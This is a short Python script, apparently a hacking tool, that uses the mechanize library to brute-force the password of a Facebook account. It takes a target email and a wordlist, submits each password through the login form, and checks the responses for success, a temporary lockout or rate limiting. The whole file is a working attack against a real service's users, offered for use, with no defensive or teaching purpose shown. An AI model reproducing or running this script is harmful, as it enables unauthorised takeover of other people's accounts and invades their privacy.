import time 
import argparse
import mechanize

class Hack():
    def __init__(self, email, wordlist, url):
        self.__email = email
        self.__wordlist = wordlist
        self.__url = url


    def _get_website(self):
        br = mechanize.Browser()

        br.set_handle_robots(False)
        
        br.addheaders = [("User-agent","Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.10 (maverick) Firefox/3.6.13")]

        response = br.open(self.__url)

        time.sleep(3)

        if response.code == 200:
            print("[+] Connected to Facebook")
            self.__start_hacking(br)
        else:
            print("[-] Unable to connect to the Facebook!")
            exit(0)


    def __start_hacking(self, br):
        with open(self.__wordlist, "r") as password_list:
            passwords = password_list.readlines()

        for password in passwords:
            password = password.strip()

            br.select_form(nr = 0)

            print("Trying Password: " + str(password) + "\n" + "-----------------")

            br["email"] = self.__email
            br["pass"] = password

            logged_in = br.submit()

            time.sleep(5)

            if logged_in.get_data().__contains__(b'just tap your account instead of typing a password.'):
                print("Password Found!")
                exit(0)
            elif logged_in.get_data().__contains__(b"To help keep your account safe, we temporarily locked it"):
                print("Account Locked Temporarily!")
                exit(0)
            elif logged_in.get_data().__contains__(b"We limit how often you can post, comment or do other things in a given amount of time in order to help protect the community from spam. You can try again later"):
                print("Feature not available right now!")
                exit(0)
            else:
                time.sleep(5)
                pass


def start():
    parser = argparse.ArgumentParser(description="Hack Facebook account")

    parser.add_argument("-e", dest = "email_address", type=str, help="Email of the target")
    parser.add_argument("-w", dest = "wordlist", type=str, help="Password Wordlist in txt format")

    args = parser.parse_args()

    hack = Hack(email=args.email_address, wordlist=args.wordlist, url="https://www.facebook.com")
    hack._get_website()


start()